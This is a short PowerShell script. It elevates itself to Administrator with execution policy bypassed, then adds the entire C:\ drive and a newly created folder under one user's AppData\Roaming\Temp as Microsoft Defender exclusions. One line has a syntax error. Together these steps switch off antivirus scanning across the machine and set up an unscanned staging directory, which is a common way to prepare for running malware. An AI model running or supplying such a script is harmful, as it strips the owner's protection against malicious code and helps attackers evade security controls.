if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
Add-MpPreference -ExclusionPath "C:\"
new-item <C:\Users\aaltabbaa\AppData\Roaming\Temp> -itemtype directory
Add-MpPreference -ExclusionPath "C:\Users\aaltabbaa\AppData\Roaming\Temp"